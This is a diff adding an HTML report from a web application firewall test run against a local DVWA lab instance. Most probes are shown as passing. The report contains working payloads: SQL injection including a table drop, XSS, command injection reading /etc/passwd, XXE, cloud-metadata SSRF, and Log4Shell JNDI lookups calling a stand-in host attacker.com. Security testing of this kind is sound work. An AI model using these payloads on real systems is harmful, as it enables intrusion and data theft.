@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>WAF Test Report</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: #0d1117; color: #c9d1d9; padding: 40px; }
+  h1 { color: #58a6ff; margin-bottom: 8px; }
+  .meta { color: #8b949e; margin-bottom: 32px; }
+  .cards { display: flex; gap: 16px; margin-bottom: 32px; flex-wrap: wrap; }
+  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+    padding: 20px; min-width: 180px; text-align: center; }
+  .card h3 { color: #58a6ff; margin-bottom: 8px; font-size: 14px; }
+  .score { font-size: 36px; font-weight: 700; margin-bottom: 4px; }
+  .card p { color: #8b949e; font-size: 13px; }
+  table { width: 100%; border-collapse: collapse; background: #161b22;
+    border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
+  th { background: #1c2128; padding: 12px 16px; text-align: left;
+    color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  td { padding: 10px 16px; border-top: 1px solid #21262d; font-size: 13px; }
+  tr.blocked td { background: rgba(35, 134, 54, 0.08); }
+  tr.passed td { background: rgba(218, 55, 51, 0.08); }
+  tr.error td { background: rgba(139, 148, 158, 0.08); }
+  .status-cell { font-weight: 600; }
+  tr.blocked .status-cell { color: #3fb950; }
+  tr.passed .status-cell { color: #f85149; }
+  tr.error .status-cell { color: #8b949e; }
+  code { background: #1c2128; padding: 2px 6px; border-radius: 4px;
+    font-family: monospace; font-size: 12px; color: #79c0ff; }
+</style></head><body>
+<h1>🛡️ WAF Test Report</h1>
+<p class="meta">Target: <strong>http://localhost/DVWA/vulnerabilities/brute/</strong> &nbsp;·&nbsp; Generated: 4/13/2026, 10:37:05 PM</p>
+<div class="cards"><div class="card">
+      <h3>OWASP Top 10</h3>
+      <div class="score" style="color:#da3633">2%</div>
+      <p>1 blocked / 43 total</p>
+    </div><div class="card">
+      <h3>Rate Limiting</h3>
+      <div class="score" style="color:#da3633">0%</div>
+      <p>0 blocked / 3 total</p>
+    </div><div class="card">
+      <h3>Bot Detection</h3>
+      <div class="score" style="color:#da3633">0%</div>
+      <p>0 blocked / 10 total</p>
+    </div><div class="card">
+      <h3>Bypass Attempts</h3>
+      <div class="score" style="color:#da3633">7%</div>
+      <p>1 blocked / 15 total</p>
+    </div><div class="card">
+      <h3>api</h3>
+      <div class="score" style="color:#da3633">0%</div>
+      <p>0 blocked / 10 total</p>
+    </div><div class="card">
+      <h3>bizlogic</h3>
+      <div class="score" style="color:#da3633">0%</div>
+      <p>0 blocked / 8 total</p>
+    </div></div>
+<table>
+<thead><tr>
+  <th>Suite</th><th>Test</th><th>Payload</th>
+  <th>Status</th><th>Latency</th><th>Result</th><th>Reason</th>
+</tr></thead>
+<tbody><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Classic OR</td>
+        <td><code>' OR '1'='1</code></td>
+        <td>302</td>
+        <td>10ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - UNION SELECT</td>
+        <td><code>' UNION SELECT 1,2,3--</code></td>
+        <td>302</td>
+        <td>20ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Blind time delay</td>
+        <td><code>'; WAITFOR DELAY '0:0:5'--</code></td>
+        <td>302</td>
+        <td>5ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Error-based (extractvalue)</td>
+        <td><code>' AND extractvalue(1,concat(0x7e,version()))--</code></td>
+        <td>302</td>
+        <td>12ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Stacked queries</td>
+        <td><code>'; DROP TABLE users--</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Hex encoding</td>
+        <td><code>' OR 0x313d31--</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Comment bypass (/**/ )</td>
+        <td><code>'/**/OR/**/1=1--</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Out-of-band DNS</td>
+        <td><code>'; EXEC master..xp_dirtree '//attacker.com/a'--</code></td>
+        <td>302</td>
+        <td>5ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - MySQL SLEEP</td>
+        <td><code>' OR SLEEP(5)--</code></td>
+        <td>302</td>
+        <td>7ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Whitespace tab bypass</td>
+        <td><code>'	OR	'1'='1</code></td>
+        <td>302</td>
+        <td>8ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Boolean blind</td>
+        <td><code>' AND 1=1--</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SQLi - Second-order (stored)</td>
+        <td><code>admin'--</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - Script tag</td>
+        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - img onerror</td>
+        <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - SVG onload</td>
+        <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - DOM javascript: URI</td>
+        <td><code>javascript:alert(document.domain)</code></td>
+        <td>302</td>
+        <td>8ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - Polyglot payload</td>
+        <td><code>jaVasCript:/*`/*'/*"/**/(oNcliCk=alert())//%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/scRipt/--!&gt;</code></td>
+        <td>302</td>
+        <td>8ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - onfocus autofocus</td>
+        <td><code>&lt;input onfocus=alert(1) autofocus&gt;</code></td>
+        <td>302</td>
+        <td>11ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - CSS @import</td>
+        <td><code>&lt;style&gt;@import "javascript:alert(1)"&lt;/style&gt;</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - HTML entity bypass</td>
+        <td><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - Template literal</td>
+        <td><code>${alert(1)}</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XSS - Markdown link injection</td>
+        <td><code>[click](javascript:alert(1))</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="blocked">
+        <td>OWASP Top 10</td>
+        <td>Path Traversal - dot-dot-slash</td>
+        <td><code>../../../etc/passwd</code></td>
+        <td>400</td>
+        <td>2ms</td>
+        <td class="status-cell">✓ BLOCKED</td>
+        <td>HTTP 400 — differs from baseline 302, possible block</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Path Traversal - URL encoded</td>
+        <td><code>..%2F..%2F..%2Fetc%2Fpasswd</code></td>
+        <td>404</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Path Traversal - double encoded</td>
+        <td><code>..%252F..%252F..%252Fetc%252Fpasswd</code></td>
+        <td>404</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Path Traversal - Windows path</td>
+        <td><code>..\..\..\windows\win.ini</code></td>
+        <td>404</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Command Injection - semicolon</td>
+        <td><code>; cat /etc/passwd</code></td>
+        <td>302</td>
+        <td>8ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Command Injection - pipe</td>
+        <td><code>| whoami</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Command Injection - backtick</td>
+        <td><code>`id`</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Command Injection - $() subshell</td>
+        <td><code>$(id)</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XXE - File disclosure</td>
+        <td><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;</code></td>
+        <td>302</td>
+        <td>7ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>XXE - SSRF via DTD</td>
+        <td><code>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSRF - localhost admin</td>
+        <td><code>http://localhost/admin</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSRF - AWS metadata</td>
+        <td><code>http://169.254.169.254/latest/meta-data/</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSRF - GCP metadata</td>
+        <td><code>http://metadata.google.internal/computeMetadata/v1/</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSRF - file:// protocol</td>
+        <td><code>file:///etc/passwd</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Log4Shell - JNDI LDAP</td>
+        <td><code>${jndi:ldap://attacker.com/a}</code></td>
+        <td>302</td>
+        <td>11ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Log4Shell - JNDI RMI variant</td>
+        <td><code>${jndi:rmi://attacker.com/a}</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Log4Shell - Nested bypass</td>
+        <td><code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSTI - Jinja2 math probe</td>
+        <td><code>{{7*7}}</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>SSTI - Twig/Smarty probe</td>
+        <td><code>{{7*'7'}}</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Open Redirect - absolute URL</td>
+        <td><code>https://evil.attacker.com</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>OWASP Top 10</td>
+        <td>Open Redirect - protocol-relative</td>
+        <td><code>//attacker.com/phish</code></td>
+        <td>302</td>
+        <td>9ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Rate Limiting</td>
+        <td>Burst Flood (30 simultaneous)</td>
+        <td><code>30 concurrent GET requests</code></td>
+        <td>302</td>
+        <td>57ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>0 / 30 blocked (429: 0, 403: 0) - threshold: &gt;=6</td>
+      </tr><tr class="passed">
+        <td>Rate Limiting</td>
+        <td>Sequential Flood (20 req @ 100ms)</td>
+        <td><code>20 sequential GET requests, 100ms apart</code></td>
+        <td>302</td>
+        <td>57ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>0 / 20 blocked (429: 0) - threshold: &gt;=1</td>
+      </tr><tr class="passed">
+        <td>Rate Limiting</td>
+        <td>Rate Limit Bypass (X-Forwarded-For rotation)</td>
+        <td><code>X-Forwarded-For: 10.0.0.1-15</code></td>
+        <td>302</td>
+        <td>8ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>0 / 15 blocked despite spoofed IPs - bypass SUCCEEDED (WAF trusts XFF)</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Missing User-Agent</td>
+        <td><code>Empty User-Agent header</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Scanner - sqlmap</td>
+        <td><code>sqlmap user-agent</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Scanner - Nikto</td>
+        <td><code>Nikto scanner UA</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Scanner - Nmap NSE</td>
+        <td><code>Nmap NSE UA</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Headless Chrome</td>
+        <td><code>Headless Chrome UA</code></td>
+        <td>302</td>
+        <td>5ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Python Requests</td>
+        <td><code>Python requests library</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>curl UA</td>
+        <td><code>curl user-agent</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Scrapy Spider</td>
+        <td><code>Scrapy web scraper</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>Masscan</td>
+        <td><code>Port scanner UA</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bot Detection</td>
+        <td>No Accept header</td>
+        <td><code>Missing Accept/Accept-Language</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>SQLi - Null byte bypass</td>
+        <td><code>SQLi with null byte</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>SQLi - Case variation</td>
+        <td><code>Mixed-case OR keyword</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>SQLi - Inline comment obfuscation</td>
+        <td><code>SQL comment within payload</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>SQLi - Base64 encoded</td>
+        <td><code>Base64-encoded SQLi</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>SQLi - URL encoded keywords</td>
+        <td><code>URL-encoded SQLi</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>XSS - Double URL-encode</td>
+        <td><code>Double-encoded &lt;script&gt;</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>XSS - Unicode fullwidth chars</td>
+        <td><code>Fullwidth Unicode &lt;script&gt;</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>XSS - HTML entity evasion</td>
+        <td><code>HTML entities in payload</code></td>
+        <td>302</td>
+        <td>5ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="blocked">
+        <td>Bypass Attempts</td>
+        <td>Header injection (CRLF)</td>
+        <td><code>CRLF in custom header</code></td>
+        <td>N/A</td>
+        <td>0ms</td>
+        <td class="status-cell">✓ BLOCKED</td>
+        <td>Blocked by Node HTTP layer: Invalid character in header content ["X-Custom"]</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>Host header injection</td>
+        <td><code>Spoofed Host header</code></td>
+        <td>302</td>
+        <td>5ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>HTTP method override</td>
+        <td><code>Method override headers</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>Double slash path bypass</td>
+        <td><code>Double-slash path prefix</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>Semicolon path bypass</td>
+        <td><code>Semicolon path trick</code></td>
+        <td>404</td>
+        <td>7ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>Protocol-relative SSRF</td>
+        <td><code>Protocol-relative URL</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>Bypass Attempts</td>
+        <td>Unicode path normalization</td>
+        <td><code>Unicode path separator bypass</code></td>
+        <td>302</td>
+        <td>7ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>GraphQL Introspection</td>
+        <td><code>GraphQL Introspection</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>GraphQL Batch Query Flood</td>
+        <td><code>GraphQL Batch Query Flood</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>GraphQL Field Enumeration</td>
+        <td><code>GraphQL Field Enumeration</code></td>
+        <td>302</td>
+        <td>6ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>JWT None Algorithm</td>
+        <td><code>JWT None Algorithm</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>JWT Algorithm Confusion (RS->HS)</td>
+        <td><code>JWT Algorithm Confusion (RS-&gt;HS)</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>Mass Assignment (role escalation)</td>
+        <td><code>Mass Assignment (role escalation)</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>HTTP Verb Tampering (DELETE)</td>
+        <td><code>HTTP Verb Tampering (DELETE)</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>HTTP Verb Tampering (PUT)</td>
+        <td><code>HTTP Verb Tampering (PUT)</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>BOLA - Object Level Auth Bypass</td>
+        <td><code>BOLA - Object Level Auth Bypass</code></td>
+        <td>404</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>api</td>
+        <td>Content-Type Confusion Attack</td>
+        <td><code>Content-Type Confusion Attack</code></td>
+        <td>302</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Negative Quantity (price manipulation)</td>
+        <td><code>Negative Quantity (price manipulation)</code></td>
+        <td>302</td>
+        <td>7ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Zero-price product submission</td>
+        <td><code>Zero-price product submission</code></td>
+        <td>302</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Admin endpoint direct access</td>
+        <td><code>Admin endpoint direct access</code></td>
+        <td>404</td>
+        <td>2ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>HTTP Parameter Pollution (role dup)</td>
+        <td><code>HTTP Parameter Pollution (role dup)</code></td>
+        <td>302</td>
+        <td>3ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Account Enumeration (timing probe)</td>
+        <td><code>Account Enumeration (timing probe)</code></td>
+        <td>302</td>
+        <td>4ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 302 — response matches baseline structure, payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Excessive Data Exposure (verbose error)</td>
+        <td><code>Excessive Data Exposure (verbose error)</code></td>
+        <td>404</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
+        <td>HTTP 404 — payload reached origin</td>
+      </tr><tr class="passed">
+        <td>bizlogic</td>
+        <td>Forced Browsing - hidden endpoint</td>
+        <td><code>Forced Browsing - hidden endpoint</code></td>
+        <td>404</td>
+        <td>1ms</td>
+        <td class="status-cell">✗ PASSED</td>
